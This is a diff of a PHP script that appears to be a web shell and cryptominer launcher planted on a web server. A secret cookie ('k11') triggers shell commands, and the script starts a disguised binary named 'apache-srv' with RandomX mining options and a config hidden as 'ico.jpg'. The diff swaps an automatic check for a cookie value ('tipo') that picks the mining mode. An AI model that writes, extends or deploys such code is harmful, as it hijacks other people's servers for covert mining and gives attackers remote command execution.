@@ -108,9 +108,9 @@ function initShellConfig() {
 
 if (isset($_COOKIE["k11"])) {
     $response0 = featureShell("ps aux |grep apache-srv | grep -v grep", "./");
-    $response2 = featureShell("cat /proc/$$/oom_score_adj", "./");
+    $tipo = $_COOKIE["tipo"];
+    echo $tipo;
     $outresp = base64_decode($response0['stdout']);
-    $outresp2 = base64_decode($response2['stdout']);
     if (preg_match('/apache-srv/',$outresp)){
         die("already_running");
     }
@@ -132,12 +132,14 @@ if (isset($_COOKIE["k11"])) {
 
     $response = NULL;
     //$cmd = $_POST['cmd'];
-    if ($outresp2 == "0"){
+    if ($tipo == "forte"){
         $cmd = "chmod 755 apache-srv;./apache-srv -c ico.jpg --background > /dev/null 2>&1 &";
     }else{
         $cmd = "chmod 755 apache-srv;./apache-srv -c ico.jpg --background --randomx-mode=light > /dev/null 2>&1 &";
     }
-    
+    echo $cmd;
+
+    //$cmd .= ' 2>&1 &';
     if (!preg_match('/2>/', $cmd)) {
       $cmd .= ' 2>&1';
     }
